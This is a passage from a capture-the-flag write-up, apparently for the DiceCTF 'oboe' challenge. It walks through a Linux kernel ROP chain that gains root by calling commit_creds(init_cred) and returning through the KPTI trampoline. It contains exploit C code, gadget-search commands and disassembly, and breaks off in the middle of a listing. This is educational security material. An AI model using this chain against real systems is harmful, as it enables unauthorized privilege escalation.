The most traditional ROP chain calls `commit_creds(prepare_kernel_cred(0))` to change the UID of the current process, so that when returning to user-land, we are `root` (UID 0) instead of a low-privileged user. However, `prepare_kernel_cred(0)` no longer works (see this [patch](https://lkml.indiana.edu/hypermail/linux/kernel/2210.3/06046.html)), but we can achieve the same by calling `commit_creds(init_cred)`, which is even easier.

First of all, let’s find the offset where the return address will be on the stack. This can be done dynamically using a pattern and analyzing the crash output, or statically:

`

```
    gef> disassemble __sys_getsockname
    Dump of assembler code for function __sys_getsockname:
       0xffffffff81bb78a0 <+0>:     nop    WORD PTR [rax]
       0xffffffff81bb78a4 <+4>:     push   r14
       0xffffffff81bb78a6 <+6>:     push   r13
       0xffffffff81bb78a8 <+8>:     push   r12
       0xffffffff81bb78aa <+10>:    mov    r12,rdx
       0xffffffff81bb78ad <+13>:    push   rbp
       0xffffffff81bb78ae <+14>:    push   rbx
       0xffffffff81bb78af <+15>:    mov    rbx,rsi
       0xffffffff81bb78b2 <+18>:    sub    rsp,0x88
       0xffffffff81bb78b9 <+25>:    call   0xffffffff812d7610 <fdget>
```

`

As can be seen, `__sys_getsockname` pushes 5 times and then subtracts `0x88`. This means that the return address will be at offset `$rsp + 0xb0`. However, notice that the Buffer Overflow happens in `address`, which is 8 bytes below:

`

```
    __attribute__((no_stack_protector)) int __sys_getsockname(int fd, struct sockaddr __user *usockaddr,
              int __user *usockaddr_len)
    {
      struct socket *sock;
      struct sockaddr_storage address;
      CLASS(fd, f)(fd);
      int err;
    
      // ...
    }
```

`

So, the offset is `0xa8` (`21 * 8`):

![oboe 2](https://7rocky.github.io/images/other/DiceCTF/oboe-2.svg)

We need to use `bind` to achieve the above layout. Using `0x18`-sized `unix_address` objects is not very useful because some parts of the `name` value must have specific `AF_UNIX` values, so the ROP chain won’t work. However, we can use `unix_address` objects of greater size. This means that we must perform the UAF attack again in order to modify the `len` value…

Using `0x60`-sized `unix_address` objects, we can build something like:

![oboe 3](https://7rocky.github.io/images/other/DiceCTF/oboe-3.svg)

Notice that we must break the ROP chain into pieces due to `len`, `refcnt` and other requirements. Also, remember that the offset is with respect to the `name` attribute of the UAF object (the green one).

Actually, the final ROP chain I used required yet another object, and some clever gadgets to avoid the `len`, `refcnt` and first 8 bytes of `name`:

`

```
      unsigned long init_cred                   = kbase + INIT_CRED_OFFSET;
      unsigned long commit_creds                = kbase + COMMIT_CREDS_OFFSET;
      unsigned long ret                         = kbase + RET_OFFSET;
      unsigned long pop_rcx_ret                 = kbase + POP_RCX_RET_OFFSET;
      unsigned long pop_rdi_ret                 = kbase + POP_RDI_RET_OFFSET;
      unsigned long pop_r12_pop_rbp_pop_rbx_ret = kbase + POP_R12_POP_RBP_POP_RBX_RET_OFFSET;
      unsigned long kpti_trampoline             = kbase + KPTI_TRAMPOLINE_OFFSET;
    
      unsigned long long rop_chain1[] = {
        pop_r12_pop_rbp_pop_rbx_ret,
      };
    
      unsigned long long rop_chain2[] = {
        pop_rdi_ret,
        init_cred,
        commit_creds,
        pop_rcx_ret,
        (unsigned long) get_shell,
        ret,
        ret,
        ret,
        pop_r12_pop_rbp_pop_rbx_ret,
      };
    
      unsigned long long rop_chain3[] = {
        kpti_trampoline,
        0,
        0,
        0,
        0,
        0,
        user_rsp,
      };
    
      struct sockaddr_un rop_payload1 = { .sun_family = AF_UNIX, .sun_path = { 0 } };
      struct sockaddr_un rop_payload2 = { .sun_family = AF_UNIX, .sun_path = { 0 } };
      struct sockaddr_un rop_payload3 = { .sun_family = AF_UNIX, .sun_path = { 0 } };
    
      memcpy(rop_payload1.sun_path + 0x46, rop_chain1, sizeof(rop_chain1));
      memcpy(rop_payload2.sun_path + 0x06, rop_chain2, sizeof(rop_chain2));
      memcpy(rop_payload3.sun_path + 0x06, rop_chain3, sizeof(rop_chain3));
```

`

The ROP chain basically calls `commit_creds(init_cred)` and then uses the KPTI trampoline to safely return to `get_shell` in user-land.

ROP gadgets can be found easily using `ROPgadget` and `grep`:

`

```
    $ ROPgadget --all --range 0xffffffff81000000-0xffffffff82200000 --binary vmlinux > rop.txt
```

`

To make the KPTI trampoline work, we need to find the address of `mov rdi, rsp` in `entry_SYSCALL_64` (offset `0x1000168`):

`

```
    gef> disassemble entry_SYSCALL_64
    Dump of assembler code for function entry_SYSCALL_64:
       0xffffffff82000080 <+0>:     endbr64
       ...
       0xffffffff82000168 <+232>:   mov    rdi,rsp
       0xffffffff8200016b <+235>:   mov    rsp,QWORD PTR gs:[rip+0x7e005e91]        # 0x6004 <cpu_tss_rw+4>
       0xffffffff82000173 <+243>:   push   QWORD PTR [rdi+0x28]
       0xffffffff82000176 <+246>:   push   QWORD PTR [rdi]
       0xffffffff82000178 <+248>:   jmp    0xffffffff820001bd <entry_SYSCALL_64+317>
       0xffffffff8200017a <+250>:   push   rax
       0xffffffff8200017b <+251>:   mov    rdi,cr3
       0xffffffff8200017e <+254>:   jmp    0xffffffff820001b2 <entry_SYSCALL_64+306>
       0xffffffff82000180 <+256>:   mov    rax,rdi
       0xffffffff82000183 <+259>:   and    rdi,0x7ff
       0xffffffff8200018a <+266>:   bt     QWORD PTR gs:[rip+0x7e02c583],rdi        # 0x2c716 <cpu_tlbstate+22>
       0xffffffff82000193 <+275>:   jae    0xffffffff820001a3 <entry_SYSCALL_64+291>
       0xffffffff82000195 <+277>:   btr    QWORD PTR gs:[rip+0x7e02c578],rdi        # 0x2c716 <cpu_tlbstate+22>
       0xffffffff8200019e <+286>:   mov    rdi,rax
       0xffffffff820001a1 <+289>:   jmp    0xffffffff820001ab <entry_SYSCALL_64+299>
       0xffffffff820001a3 <+291>:   mov    rdi,rax
       0xffffffff820001a6 <+294>:   bts    rdi,0x3f
       0xffffffff820001ab <+299>:   or     rdi,0x800
       0xffffffff820001b2 <+306>:   or     rdi,0x1000
       0xffffffff820001b9 <+313>:   mov    cr3,rdi
       0xffffffff820001bc <+316>:   pop    rax
       0xffffffff820001bd <+317>:   pop    rdi
```

---

*Truncated at 1200 lines. Full text: <https://7rocky.github.io/en/ctf/other/dicectf/oboe/>*
